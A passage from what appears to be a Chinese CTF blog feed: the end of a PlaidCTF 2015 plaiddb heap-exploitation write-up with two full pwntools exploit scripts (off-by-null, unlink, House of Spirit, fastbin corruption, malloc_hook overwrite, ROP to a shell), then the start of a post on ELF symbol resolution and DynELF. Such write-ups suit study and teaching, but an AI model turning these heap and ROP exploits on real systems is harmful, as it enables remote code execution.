- 0x10                       0x3c0 - 0x10 +---- :: ----+ |   0x100    | &#39;X&#39; * 0xf8                           &#39;X&#39; * 0xf8 |     ::     | +------------+ 0x4c0 - 0x10                                    +---- :: ----+ |   0x120    | &#39;B&#39; * 0xf8 + p64(0x21) + &#39;C&#39; * 0x18 =&gt; [freed]  |     ::     | +------------+                                    0x5c0 - 0x10 +------------+                                                     &#39;C&#39; * 0x18 |    0x20    |                                                                +------------+</code></pre><p>利用 PUT 泄漏出 heap，并且能构造一个泄漏函数：</p><pre><code class="python"># Leak Heap AddressDEL(&#39;3&#39;) # put a previous node chunk into fastbinPUT(&#39;KEY1&#39;, (&#39;A&#39; * 0x108 +    p64(0x40) + p64(0) + &#39;D&#39; * 0x30 +    p64(0x21) + p64(0) + &#39;C&#39; * 0x10 +    p64(0x21) + &#39;KEY1\x00&#39;).ljust(1000, &#39;Q&#39;))PUT(&#39;LEAKBUF&#39;, &#39;&#39;)data = GET(&#39;KEY1&#39;)heap_base = u64(data[0x110:0x118]) - 0x150info(&#39;heap_base = &#39; + hex(heap_base))# Function for Leaking Memorydef leak(addr, size):    PUT(&#39;KEY1&#39;, &#39;A&#39; * 0x3e8)    PUT(&#39;KEY1&#39;, data[:0x118] + p64(size) + p64(addr) + data[0x128:])    return GET(&#39;LEAKBUF&#39;)</code></pre><p>LEAKBUF 在内存中的布局如下，LEAKBUF 的结构体中的 data 和 data_size 可以被 overlap，再用 PUT 泄漏：</p><pre><code> +------------+ 0x0f0 - 0x10 |    0x40    | node &#39;3&#39; =&gt; [freed] =&gt; node &#39;KEY1&#39; +------------+ 0x130 - 0x10 |    0x20    | &#39;3&#39; =&gt; [freed] =&gt; &#39;&#39; +------------+ 0x150 - 0x10 |    0x20    | &#39;&#39; =&gt; [freed] =&gt; &#39;LEAKBUF&#39; +------------+ 0x170 - 0x10 |    0x40    | [freed] +------------+ 0x1b0 - 0x10 |    0x20    | [freed] +------------+ 0x1d0 - 0x10 |   0x3f0    | [freed] =&gt; chunk +---- :: ----+ 0x260 - 0x10 |     ::     | [freed] +---- :: ----+ 0x2a0 - 0x10 |     ::     | [freed] +---- :: ----+ 0x2c0 - 0x10 |     ::     | [freed] +---- :: ----+ 0x2e0 - 0x10 |   [0x40]   | [freed] =&gt; node &#39;LEAKBUF&#39; +---- :: ----+ 0x320 - 0x10 |   [0x20]   | [freed] +---- :: ----+ 0x340 - 0x10 |   [0x20]   | [freed] =&gt; &#39;KEY1&#39; +---- :: ----+ 0x360 - 0x10 |     ::     | [freed] +---- :: ----+ 0x3a0 - 0x10 |     ::     | [freed] +---- :: ----+ 0x3c0 - 0x10 |     ::     | &#39;X&#39; * 0xf8 +---- :: ----+ 0x4c0 - 0x10 |     ::     | [freed] +------------+ 0x5c0 - 0x10 |    0x20    | &#39;C&#39; * 0x18 +------------+</code></pre><p>接下来构造一个假的 fastbin chunk 来进行 House-of-Spirit，然后改掉它的 fd 指针：</p><pre><code class="python"># House of Spirit + Fastbin Corruption + ROPPUT(&#39;KEY1&#39;, &#39;A&#39; * 0x3e8)PUT(&#39;KEY1&#39;, (&#39;A&#39; * 0x108 +    p64(0x40) + p64(heap_base + 0x3e0) + # point LEAKBUF&#39;s key to &#39;P\x00&#39;    p64(0x64) + p64(0) + p64(0) + p64(0) + p64(0) +    p64(0x40) + p64(0x40) + &#39;KEY1\x00&#39;.ljust(0x38, &#39;A&#39;) + # 0x358    p64(0x40) + &#39;A&#39; * 0x78 + # 0x3d8    p64(0x40) + &#39;P\x00&#39;.ljust(0x38, &#39;A&#39;) + p64(0x41)).ljust(0x3e8, &#39;Q&#39;))DEL(&#39;P&#39;) # house of spiritDEL(&#39;KEY1&#39;)PUT(&#39;KEY1&#39;, (&#39;A&#39; * 0x108 +    p64(0x40) + p64(heap_base + 0x3e0) +    p64(0x64) + p64(0) + p64(0) + p64(0) + p64(0) +    p64(0x40) + p64(0x40) + p64(fake_chunk_addr) + &#39;A&#39; * 0x30 +    p64(0x40) + &#39;A&#39; * 0x78 + # 0x3d8    p64(0x40) + &#39;A&#39; * 0x40 + # 0x420    p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr)).ljust(0x3e8, &#39;Q&#39;) # place gadgets) # fastbin corruption</code></pre><p>最后这里堆布局比较复杂，大概就是伪造一个 fastbin 然后再改它的指针，后面就能取到指针对应的 fake chunk：</p><pre><code> +------------+ 0x0f0 - 0x10 |    0x40    | node &#39;KEY1&#39; +------------+ 0x130 - 0x10 |    0x20    | &#39;&#39; +------------+ 0x150 - 0x10 |    0x20    | &#39;LEAKBUF&#39; +------------+ 0x170 - 0x10 |    0x40    | [freed] +------------+ 0x1b0 - 0x10 |    0x20    | [freed] +------------+ 0x1d0 - 0x10 |   0x3f0    | chunk +---- :: ----+ 0x260 - 0x10 |     ::     | [freed] +---- :: ----+ 0x2a0 - 0x10 |     ::     | [freed] +---- :: ----+ 0x2c0 - 0x10 |     ::     | [freed] +---- :: ----+ 0x2e0 - 0x10 |   [0x40]   | node &#39;LEAKBUF&#39; +---- :: ----+ 0x320 - 0x10 |   [0x20]   | [freed] +---- :: ----+ 0x340 - 0x10 |   [0x20]   | &#39;KEY1&#39; =&gt; fake_chunk_addr +---- :: ----+ 0x360 - 0x10 |     ::     | [freed] +---- :: ----+ 0x3a0 - 0x10 |     ::     | [freed] +---- :: ----+ 0x3c0 - 0x10 |   [0x40]   | &#39;X&#39; * 0xf8 =&gt; &#39;P\x00&#39; =&gt; &#39;A&#39; * 0x40 + gadgets +---- :: ----+ 0x4c0 - 0x10 |     ::     | [freed] +------------+ 0x5c0 - 0x10 |    0x20    | &#39;C&#39; * 0x18 +------------+</code></pre><p>最后用 PUT 里的任意大小 malloc 取一个大小为 56 的 chunk。前面构造的 fd 指针位置指向读进去的 data_size 存储的位置，因为程序用的是 strtoul，所以送出去的字符串都会被存在栈上，就能构造一个大小合适的 chunk。为了绕过对 main_arena 的检查，把 fake chunk 的 IS_MMAP 标志位开启：</p><pre><code class="python">cmd(&#39;PUT&#39;)p.recvuntil(&#39;Enter row key:&#39;)p.sendline(&#39;KEY1&#39;)p.recvuntil(&#39;Enter data size:&#39;)p.send(&#39;56&#39;.ljust(8, &#39; &#39;) + p64(0x42))p.recvuntil(&#39;PROMPT: Enter data:&#39;)p.send((&#39;A&#39; * 7 + p64(canary) + &#39;A&#39; * 0x10 + p64(fake_rbp) + p64(leave_ret)).ljust(55, &#39;A&#39;))</code></pre><p>最后送 data 的时候不是补成 55 是因为前面用 fgets 读 data_size 的时候最后面多补了个 <code>&quot;\x00&quot;</code>：</p><pre><code>0x7fff7e985540: 0x2020202020203635      0x00000000000000420x7fff7e985550: 0x4141414141414100      0xa5f15260d10909000x7fff7e985560: 0x4141414141414141      0x41414141414141410x7fff7e985570: 0x00005560f2703418      0x00007ff1b1cc9a9e0x7fff7e985580: 0x4141414141414141      0xa5f15260d1090900</code></pre><p>在 CTF-Wiki 上还有另外一种更简洁的做法，先造一堆 fastbin，接着构造 chunk。最后用 fastbin attack 改 malloc_hook：</p><pre><code>datastore-&gt;malloc(56)             = 0x55ac13f22010datastore-&gt;malloc(8)              = 0x55ac13f22050datastore-&gt;malloc(9)              = 0x55ac13f22070datastore-&gt;malloc(56)             = 0x55ac13f22090 =&gt; &#39;X&#39; * 0x200datastore-&gt;malloc(8)              = 0x55ac13f220d0datastore-&gt;malloc(56)             = 0x55ac13f220f0datastore-&gt;malloc(56)             = 0x55ac13f22130datastore-&gt;malloc(8)              = 0x55ac13f22170datastore-&gt;malloc(56)             = 0x55ac13f22190datastore-&gt;malloc(56)             = 0x55ac13f221d0datastore-&gt;malloc(8)              = 0x55ac13f22210datastore-&gt;malloc(56)             = 0x55ac13f22230datastore-&gt;malloc(56)             = 0x55ac13f22270datastore-&gt;malloc(8)              = 0x55ac13f222b0datastore-&gt;malloc(56)             = 0x55ac13f222d0datastore-&gt;malloc(56)             = 0x55ac13f22310datastore-&gt;malloc(8)              = 0x55ac13f22350datastore-&gt;malloc(56)             = 0x55ac13f22370datastore-&gt;malloc(56)             = 0x55ac13f223b0datastore-&gt;malloc(8)              = 0x55ac13f223f0 =&gt; &#39;6&#39;datastore-&gt;malloc(56)             = 0x55ac13f22410datastore-&gt;malloc(56)             = 0x55ac13f22450datastore-&gt;malloc(8)              = 0x55ac13f22490 =&gt; &#39;4&#39; =&gt; [freed] =&gt; &#39;fillup2&#39;datastore-&gt;malloc(56)             = 0x55ac13f224b0 =&gt; [freed] =&gt; node &#39;fillup2&#39;datastore-&gt;malloc(56)             = 0x55ac13f224f0 =&gt; node &#39;4&#39; =&gt; [freed] =&gt; node &#39;fillup1&#39;datastore-&gt;malloc(8)              = 0x55ac13f22530 =&gt; &#39;3&#39; =&gt; [freed]datastore-&gt;malloc(56)             = 0x55ac13f22550 =&gt; node &#39;6&#39;datastore-&gt;malloc(56)             = 0x55ac13f22590 =&gt; node &#39;5&#39; =&gt; [freed]datastore-&gt;malloc(8)              = 0x55ac13f225d0 =&gt; &#39;5&#39; =&gt; [freed]datastore-&gt;malloc(56)             = 0x55ac13f225f0 =&gt; node &#39;3&#39; =&gt; [freed]datastore-&gt;malloc(56)             = 0x55ac13f22630 =&gt; node &#39;1&#39; =&gt; [freed]datastore-&gt;malloc(8)              = 0x55ac13f22670 =&gt; &#39;2&#39;datastore-&gt;malloc(56)             = 0x55ac13f22690 =&gt; node &#39;2&#39;datastore-&gt;malloc(8)              = 0x55ac13f226d0 =&gt; &#39;1&#39; =&gt; [freed] =&gt; &#39;fillup1&#39;datastore-&gt;malloc(512)            = 0x55ac13f226f0 =&gt; &#39;1&#39; * 0x200 =&gt; [freed] &lt;= unlink pointer =&gt; &#39;X&#39; * 0x200datastore-&gt;malloc(80)             = 0x55ac13f22900 =&gt; &#39;2&#39; * 0x50datastore-&gt;malloc(104)            = 0x55ac13f22960 =&gt; &#39;5&#39; * 0x68 =&gt; [freed] &lt;= overlap fddatastore-&gt;malloc(504)            = 0x55ac13f229d0 =&gt; &#39;3&#39; * 0x1f8 =&gt; [freed] =&gt; &#39;A&#39; * 0x1f0 + p64(0xdb0 - 0x6f0)datastore-&gt;malloc(240)            = 0x55ac13f22bd0 =&gt; &#39;4&#39; * 0xf0 =&gt; [freed]datastore-&gt;malloc(1024)           = 0x55ac13f22cd0 =&gt; &#39;6&#39; * 0x400</code></pre><h1 id="Exploit-Script"><a href="#Exploit-Script" class="headerlink" title="Exploit Script"></a>Exploit Script</h1><p>第一种方法的 Exploit 主要是跟着 Winesap 做的：</p><pre><code class="python">#!/usr/bin/env pythonfrom pwn import *context.arch = &#39;amd64&#39;context.log_level = &#39;debug&#39;local = 0if local:    p = process(&#39;./datastore&#39;)    libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)else:    p = remote(&#39;127.0.0.1&#39;, 4000)    libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)def cmd(c):    p.recvuntil(&#39;Enter command:&#39;)    p.sendline(c)def PUT(key, data):    cmd(&#39;PUT&#39;)    p.recvuntil(&#39;Enter row key:&#39;)    p.sendline(key)    p.recvuntil(&#39;Enter data size:&#39;)    p.sendline(str(len(data)))    p.recvuntil(&#39;PROMPT: Enter data:&#39;)    p.send(data)def DEL(key):    cmd(&#39;DEL&#39;)    p.recvuntil(&#39;Enter row key:&#39;)    p.sendline(key)def GET(key):    cmd(&#39;GET&#39;)    p.recvuntil(&#39;Enter row key:&#39;)    p.sendline(key)    p.recvuntil(&#39; bytes]:\n&#39;)    return p.recvuntil(&#39;PROMPT: &#39;)[:-8]PUT(&#39;MMAP&#39;, &#39;Z&#39; * 0x21000)# Off by Null + UnlinkPUT(&#39;3&#39;, &#39;&#39;)PUT(&#39;0&#39;, &#39;C&#39; * 0x80) # smallbin for unlinkPUT(&#39;1&#39;, &#39;&#39;) # chunk for overflowPUT(&#39;2&#39;, &#39;&#39;)PUT(&#39;1&#39;, &#39;A&#39; * 0xf8)PUT(&#39;2&#39;, &#39;B&#39; * 0xf8 + p64(0x21) + &#39;C&#39; * 0x18) # chunk for off-by-null ; fake a fastbinDEL(&#39;1&#39;)DEL(&#39;X&#39; * 240 + p64(0x4c0 - 0x1d0)) # off-by-null(shrink) ; set prev_sizeDEL(&#39;0&#39;)DEL(&#39;2&#39;) # unlink#raw_input(&#39;@&#39;)# Leak Heap AddressDEL(&#39;3&#39;) # put a previous node chunk into fastbinPUT(&#39;KEY1&#39;, (&#39;A&#39; * 0x108 +    p64(0x40) + p64(0) + &#39;D&#39; * 0x30 +    p64(0x21) + p64(0) + &#39;C&#39; * 0x10 +    p64(0x21) + &#39;KEY1\x00&#39;).ljust(1000, &#39;Q&#39;))PUT(&#39;LEAKBUF&#39;, &#39;&#39;)data = GET(&#39;KEY1&#39;)heap_base = u64(data[0x110:0x118]) - 0x150info(&#39;heap_base = &#39; + hex(heap_base))#raw_input(&#39;@&#39;)# Function for Leaking Memorydef leak(addr, size):    PUT(&#39;KEY1&#39;, &#39;A&#39; * 0x3e8)    PUT(&#39;KEY1&#39;, data[:0x118] + p64(size) + p64(addr) + data[0x128:])    return GET(&#39;LEAKBUF&#39;)mmap_chunk = u64(leak(heap_base + 0xa0, 8)) - 0x10info(&#39;mmap_chunk = &#39; + hex(mmap_chunk))libc_base = u64(leak(mmap_chunk + 0x22000 + 0x750, 8)) - 0x5dc740info(&#39;libc_base = &#39; + hex(libc_base))canary = u64(leak(mmap_chunk + 0x22000 + 0x768, 8))info(&#39;canary = &#39; + hex(canary))stack_addr = u64(leak(mmap_chunk + 0x22000 + 0xa40, 8))info(&#39;stack_addr = &#39; + hex(stack_addr))#raw_input(&#39;@&#39;)# find Gadgets &amp; Bufferpop_rdi_ret = libc_base + libc.search(asm(&#39;pop rdi ; ret&#39;)).next()leave_ret = libc_base + libc.search(asm(&#39;leave ; ret&#39;)).next()system_addr = libc_base + libc.symbols[&#39;system&#39;]bin_sh_addr = libc_base + libc.search(&#39;/bin/sh&#39;).next()info(&#39;pop_rdi_ret = &#39; + hex(pop_rdi_ret))info(&#39;leave_ret = &#39; + hex(leave_ret))info(&#39;system_addr = &#39; + hex(system_addr))info(&#39;bin_sh_addr = &#39; + hex(bin_sh_addr))fake_chunk_addr = stack_addr - 0x90fake_rbp = heap_base + 0x420 - 8#raw_input(&#39;@&#39;)# House of Spirit + Fastbin Corruption + ROPPUT(&#39;KEY1&#39;, &#39;A&#39; * 0x3e8)PUT(&#39;KEY1&#39;, (&#39;A&#39; * 0x108 +    p64(0x40) + p64(heap_base + 0x3e0) + # point LEAKBUF&#39;s key to &#39;P\x00&#39;    p64(0x64) + p64(0) + p64(0) + p64(0) + p64(0) +    p64(0x40) + p64(0x40) + &#39;KEY1\x00&#39;.ljust(0x38, &#39;A&#39;) + # 0x358    p64(0x40) + &#39;A&#39; * 0x78 + # 0x3d8    p64(0x40) + &#39;P\x00&#39;.ljust(0x38, &#39;A&#39;) + p64(0x41)).ljust(0x3e8, &#39;Q&#39;))DEL(&#39;P&#39;) # house of spiritDEL(&#39;KEY1&#39;)#raw_input(&#39;@&#39;)PUT(&#39;KEY1&#39;, (&#39;A&#39; * 0x108 +    p64(0x40) + p64(heap_base + 0x3e0) +    p64(0x64) + p64(0) + p64(0) + p64(0) + p64(0) +    p64(0x40) + p64(0x40) + p64(fake_chunk_addr) + &#39;A&#39; * 0x30 +    p64(0x40) + &#39;A&#39; * 0x78 + # 0x3d8    p64(0x40) + &#39;A&#39; * 0x40 + # 0x420    p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr)).ljust(0x3e8, &#39;Q&#39;) # place gadgets) # fastbin corruption#raw_input(&#39;@&#39;)cmd(&#39;PUT&#39;)p.recvuntil(&#39;Enter row key:&#39;)p.sendline(&#39;KEY1&#39;)p.recvuntil(&#39;Enter data size:&#39;)p.send(&#39;56&#39;.ljust(8, &#39; &#39;) + p64(0x42))p.recvuntil(&#39;PROMPT: Enter data:&#39;)#raw_input(&#39;@&#39;)p.send((&#39;A&#39; * 7 + p64(canary) + &#39;A&#39; * 0x10 + p64(fake_rbp) + p64(leave_ret)).ljust(55, &#39;A&#39;))p.recvuntil(&#39;INFO: Update successful.\n&#39;)p.interactive()</code></pre><p>另一种做法：</p><pre><code class="python">#!/usr/bin/env pythonfrom pwn import *context.arch = &#39;amd64&#39;context.log_level = &#39;debug&#39;local = 1if local:    p = process(&#39;./datastore&#39;)    libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)else:    p = remote(&#39;127.0.0.1&#39;, 4000)    libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)def cmd(c):    p.recvuntil(&#39;Enter command:&#39;)    p.sendline(c)def PUT(key, data):    cmd(&#39;PUT&#39;)    p.recvuntil(&#39;Enter row key:&#39;)    p.sendline(key)    p.recvuntil(&#39;Enter data size:&#39;)    p.sendline(str(len(data)))    p.recvuntil(&#39;PROMPT: Enter data:&#39;)    p.send(data)def DEL(key):    cmd(&#39;DEL&#39;)    p.recvuntil(&#39;Enter row key:&#39;)    p.sendline(key)def GET(key):    cmd(&#39;GET&#39;)    p.recvuntil(&#39;Enter row key:&#39;)    p.sendline(key)    p.recvuntil(&#39; bytes]:\n&#39;)    return p.recvuntil(&#39;PROMPT: &#39;)[:-8]for i in range(10):    PUT(str(i), str(i) * 0x38)for i in range(10):    DEL(str(i))PUT(&#39;1&#39;, &#39;1&#39; * 0x200)PUT(&#39;2&#39;, &#39;2&#39; * 0x50)PUT(&#39;5&#39;, &#39;5&#39; * 0x68)PUT(&#39;3&#39;, &#39;3&#39; * 0x1f8)PUT(&#39;4&#39;, &#39;4&#39; * 0xf0)PUT(&#39;6&#39;, &#39;6&#39; * 0x400)DEL(&#39;5&#39;)DEL(&#39;3&#39;)DEL(&#39;1&#39;)DEL(&#39;A&#39; * 0x1f0 + p64(0xbd0 - 0x6f0)) # off-by-null + shrinkDEL(&#39;4&#39;) # unlinkPUT(&#39;fillup1&#39;, &#39;X&#39; * 0x200)PUT(&#39;fillup2&#39;, &#39;X&#39; * 0x200)data = GET(&#39;2&#39;)libc_base = u64(data[:8]) - 0x3c27b8info(&#39;libc_base = &#39; + hex(libc_base))#raw_input(&#39;@&#39;)free_hook = libc_base + libc.symbols[&#39;__free_hook&#39;]malloc_hook = libc_base + libc.symbols[&#39;__malloc_hook&#39;]system = libc_base + libc.symbols[&#39;system&#39;]one_gadgets = [0x46428, 0x4647c, 0xe9415, 0xea36d]one_gadget = libc_base + one_gadgets[1]info(&#39;one_gadget = &#39; + hex(one_gadget))PUT(&#39;fastatk&#39;, (&#39;A&#39; * 0x58 + p64(0x71) + p64(malloc_hook - 0x23)).ljust(0x100, &#39;\x00&#39;))PUT(&#39;X&#39;, &#39;X&#39; * 0x68)#raw_input(&#39;@&#39;)PUT(&#39;atk&#39;, (&#39;A&#39; * 0x13 + p64(one_gadget)).ljust(0x68, &#39;\x00&#39;))DEL(&#39;2&#39;)p.interactive()</code></pre><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/off_by_one-zh/#2-plaidctf-2015-plaiddb" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/off_by_one-zh/#2-plaidctf-2015-plaiddb</a><br><a href="https://www.youtube.com/watch?v=jEHgm7S58N8" target="_blank" rel="noopener">https://www.youtube.com/watch?v=jEHgm7S58N8</a><br><a href="http://winesap.logdown.com/posts/261369-plaid-ctf-2015-plaiddb-writeup" target="_blank" rel="noopener">http://winesap.logdown.com/posts/261369-plaid-ctf-2015-plaiddb-writeup</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;之前本来想写篇 Off-by-One 相关的，后来感觉理解了思想以后也不需要额外去多折腾什么了。这里记录一道比较复杂的题目。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctf" scheme="blog.b3ale.cn/tags/ctf/"/>
    
      <category term="wp" scheme="blog.b3ale.cn/tags/wp/"/>
    
      <category term="pwn" scheme="blog.b3ale.cn/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>A Trip of Symbol Resolution</title>
    <link href="blog.b3ale.cn/2020/04/06/A-Trip-of-Symbol-Resolution/"/>
    <id>blog.b3ale.cn/2020/04/06/A-Trip-of-Symbol-Resolution/</id>
    <published>2020-04-06T08:04:26.000Z</published>
    <updated>2020-04-09T12:54:00.781Z</updated>
    
    <content type="html"><![CDATA[<p>重看 Winesap 的视频收获颇多，重新把 return-to-dl-resolve 整理了一下。</p><a id="more"></a><h1 id="Prepare"><a href="#Prepare" class="headerlink" title="Prepare"></a>Prepare</h1><p>需要编译一个带调试信息的 libc，之前的博客里记录过。要在 gdb 里跟进带调试信息 ld.so 的 Makefile 如下：</p><pre><code>all: aa: a.c        gcc a.c -o a -Wl,-dynamic-linker /path/to/install/lib/ld-2.23.so -g</code></pre><p>使用 apt 安装的 gdb 在 <code>_dl_fixup()</code> 中不能单步跟，会直接略过，通过修改源码添加一个环境变量来更改 gdb 的跟进。这里以 gdb-7.11.1 为例：</p><pre><code class="cpp">...6501   /* If we are stepping at the source level and entered the runtime6502      loader dynamic symbol resolution code...65036504      EXEC_FORWARD: we keep on single stepping until we exit the run6505      time loader code and reach the callee&#39;s address.65066507      EXEC_REVERSE: we&#39;ve already executed the callee (backward), and6508      the runtime loader code is handled just like any other6509      undebuggable function call.  Now we need only keep stepping6510      backward through the trampoline code, and that&#39;s handled further6511      down, so there is nothing for us to do here.  */65126513   static int env_debug_resolver = -1;6514   if (env_debug_resolver == -1) {6515     char *env_debug_resolver_str = getenv(&quot;DEBUG_RESOLVER&quot;);6516     if (env_debug_resolver_str &amp;&amp; !strcmp(env_debug_resolver_str, &quot;1&quot;)) {6517       env_debug_resolver = 1;6518     } else {6519       env_debug_resolver = 0;6520     }6521   }6522   if (execution_direction != EXEC_REVERSE6523       &amp;&amp; ecs-&gt;event_thread-&gt;control.step_over_calls == STEP_OVER_UNDEBUGGABLE6524       &amp;&amp; env_debug_resolver == 06525       &amp;&amp; in_solib_dynsym_resolve_code (stop_pc))6526     {6527       CORE_ADDR pc_after_resolver =6528         gdbarch_skip_solib_resolver (gdbarch, stop_pc);...</code></pre><p>生成 Makefile 时必须添加 <code>--enable-tui</code> 才会有 layout 的界面（gdb 默认使用 Python3.5，如果有需要可以改成 Python2.7）：</p><pre><code class="bash">../configure --enable-tui --with-python=/usr/bin/python2.7</code></pre><p>如果在最后安装 gdb 的时候出现 <code>makeinfo: not found</code>，只需要装个 <code>texinfo</code> 即可：</p><pre><code class="bash">/home/b3ale/gdb-7.11.1/missing: 81: /home/b3ale/gdb-7.11.1/missing: makeinfo: not foundWARNING: &#39;makeinfo&#39; is missing on your system.         You should only need it if you modified a &#39;.texi&#39; file, or         any other file indirectly affecting the aspect of the manual.         You might want to install the Texinfo package:         &lt;http://www.gnu.org/software/texinfo/&gt;         The spurious makeinfo call might also be the consequence of         using a buggy &#39;make&#39; (AIX, DU, IRIX), in which case you might         want to install GNU make:         &lt;http://www.gnu.org/software/make/&gt;Makefile:503: recipe for target &#39;gdb.info&#39; failedmake[5]: *** [gdb.info] Error 127make[5]: Leaving directory &#39;/home/b3ale/gdb-7.11.1/build/gdb/doc&#39;Makefile:1505: recipe for target &#39;subdir_do&#39; failedmake[4]: *** [subdir_do] Error 1make[4]: Leaving directory &#39;/home/b3ale/gdb-7.11.1/build/gdb&#39;Makefile:1240: recipe for target &#39;install-only&#39; failedmake[3]: *** [install-only] Error 2make[3]: Leaving directory &#39;/home/b3ale/gdb-7.11.1/build/gdb&#39;Makefile:1237: recipe for target &#39;install&#39; failedmake[2]: *** [install] Error 2make[2]: Leaving directory &#39;/home/b3ale/gdb-7.11.1/build/gdb&#39;Makefile:9185: recipe for target &#39;install-gdb&#39; failedmake[1]: *** [install-gdb] Error 2make[1]: Leaving directory &#39;/home/b3ale/gdb-7.11.1/build&#39;Makefile:2248: recipe for target &#39;install&#39; failedmake: *** [install] Error 2</code></pre><p>在需要调试 <code>_dl_fixup()</code> 时只需要 export 一个环境变量即可：</p><pre><code class="bash">export DEBUG_RESOLVER=1</code></pre><p>对于没有链接带符号 ld 的程序，可以在本地做一个软链接，然后把程序中 ld 对应的字符串替换掉（以 32 位为例）：</p><pre><code class="bash">sed -i s/ld-linux.so.2/LD-linux.so.2/g ./binary</code></pre><h1 id="How-DynELF-Works"><a href="#How-DynELF-Works" class="headerlink" title="How DynELF Works?"></a>How DynELF Works?</h1><p>在 pwntools 中有一个工具叫 DynELF，可以通过一个任意内存读的漏洞来对获取 libc 以及解析出 libc 中任何函数的地址。它的原理跟 ELF 的相关结构有关，下面先来看看怎么使用 DynELF。</p><h2 id="PlaidCTF-2013-ropasaurusrex"><a href="#PlaidCTF-2013-ropasaurusrex" class="headerlink" title="PlaidCTF-2013-ropasaurusrex"></a>PlaidCTF-2013-ropasaurusrex</h2><p>以 PlaidCTF 2013 中的 ropasaurusrex 为例。程序很简单，明显有溢出：</p><pre><code class="cpp">ssize_t __cdecl main(){  vul();  return write(1, &quot;WIN\n&quot;, 4u);}ssize_t vul(){  char buf; // [esp+10h] [ebp-88h]  return read(0, &amp;buf, 0x100u);}</code></pre><p>通过溢出可以修改返回地址为 <code>start</code>，来构造无限次输入；同时可以跳 <code>write</code> 来泄漏信息。能构造出如下的 leak 函数，每次可以泄漏指定地址上的 4 个字节的数据：</p><pre><code class="python">elf = ELF(&#39;./ropasaurusrex&#39;)write_plt = elf.plt[&#39;write&#39;]start_addr = 0x8048340def leak(addr):    payload = flat(        &#39;A&#39; * 140,        write_plt,        start_addr,        1,        addr,        4    )    p.sendline(payload)    data = p.recv(4)    info(hex(addr) + &#39; ==&gt; &#39; + data)    return data</code></pre><p>使用 DynELF 指定开始泄漏的地址，可以把 libc 的基址泄漏出来：</p><pre><code class="python">#  0x8048000  0x8049000 r-xp     1000 0      /root/tmp/ropasaurusrexprog = DynELF(leak, 0x8048000)bases = prog.bases()info(bases)for l in bases:    if &#39;libc.so.6&#39; in l:        ptr = bases[l]info(&#39;ptr =&gt; &#39; + hex(ptr))</code></pre><p>然后从 libc 基址开始使用 DynELF 找到 <code>system</code> 和 <code>read</code> 的地址：</p><pre><code class="python">libc = DynELF(leak, ptr)system_addr = libc.lookup(&#39;system&#39;)read_addr = libc.lookup(&#39;read&#39;)</code></pre><h2 id="Lazy-Symbol-Binding"><a href="#Lazy-Symbol-Binding" class="headerlink" title="Lazy Symbol Binding"></a>Lazy Symbol Binding</h2><p>接下来慢慢解释 DynELF 是怎么实现的。先要了解延迟绑定这一概念。在程序执行的过程中，可能有些引入的 C 库函数到结束时都不会执行。所以 ELF 采用延迟绑定的技术，在第一次调用 C 库函数时才会去寻找真正的位置进行绑定：</p><ul><li>程序启动时，外部函数的地址未知（比如说在 libc 中的函数）</li><li>只有动态链接的程序需要解析函数地址，静态链接的程序不需要</li><li>函数第一次被调用时，通过 Dynamic Resolver 来计算函数的地址，并在 GOT 上做好重定位</li></ul><h2 id="ELF-Structure"><a href="#ELF-Structure" class="headerlink" title="ELF Structure"></a>ELF Structure</h2><p>接下来了解一下 ELF 文件的结构。结构体在 <a href="https://code.woboq.org/userspace/glibc/elf/elf.h.html" target="_blank" rel="noopener"><code>glibc/elf/elf.h</code></a> 中。</p><p>笼统地来说，ELF 包括 ELF Header、Program Header Table、Section（Segment）、Section Header Table 几个部分。在程序执行前和执行时，ELF 的结构是不同的。在程序执行前，ELF Header 中存储了 Section Header Table 的位置，而 Section Header Table 中又存储了每个 Section 的位置；在程序执行时，一个或多个 Section 会被映射到一个 Segment 中，ELF Header 中存储了 Program Header Table 的位置，而 Program Header Table 中存储了各个 Segment 的地址：</p><pre><code>             Linking View                        Execution View       +----------------------+             +----------------------+       |      ELF Header      |  ---+ +---  |      ELF Header      |       |----------------------|     | |     |----------------------|       | Program Header Table |     | +---&gt; | Program Header Table |  ---+       |      (optional)      |     |       |----------------------|     |       |----------------------|     |       |                      |     | +---&gt; |      Section 1       | ----|-----&gt; |      Segment 1       | &lt;---| |     |----------------------|     | |     |                      |     | |     |         ...          | ----|-+     |----------------------|     | |     |----------------------|     |       |                      |     | |---&gt; |      Section n       | ----|-----&gt; |      Segment 2       | &lt;---+ |     |----------------------|     | |     |                      | |     |         ...          | ----|-+     |----------------------| |     |----------------------|     |       | Section Header Table | +---  | Section Header Table | &lt;---+       |      (optional)      |       +----------------------+             +----------------------+</code></pre><p>几个部分大概的描述如下：</p><ul><li>Section（节区）：存放代码和数据的一块连续内存（例：.text、.data、.bss、.got）<ul><li><code>objdump -j .got.plt -s ./</code></li></ul></li><li>Segment（段）：包含多个 Section 的连续内存</li><li>Program Header Table 描述 Section 和 Segment 的对应关系，不一定所有的 Section 都会有映射，所以 Section 中的数据不一定全部出现在内存中</li></ul><p>ELF Header 中，<code>e_ident</code> 存储了 Magic Number 即 <code>&quot;\x7fELF&quot;</code>，<code>e_machine</code> 即程序对应的架构，<code>e_entry</code> 存储了程序的入口点，<code>e_phoff</code> 和 <code>e_shoff</code> 分别存储了 Program Header Table 和 Section Header Table 的偏移，<code>e_phentsize</code> 和 <code>e_shentsize</code> 分别存储了 Program Header Table 和 Section Header Table 的结构体大小，<code>e_phnum</code> 和 <code>e_shnum</code> 分别存储了 Program Header Table 和 Section Header Table 中 Header 的数量：</p><pre><code class="cpp">typedef struct{  unsigned char        e_ident[EI_NIDENT];        /* Magic number and other info */  Elf32_Half        e_type;                        /* Object file type */  Elf32_Half        e_machine;                /* Architecture */  Elf32_Word        e_version;                /* Object file version */  Elf32_Addr        e_entry;                /* Entry point virtual address */  Elf32_Off        e_phoff;                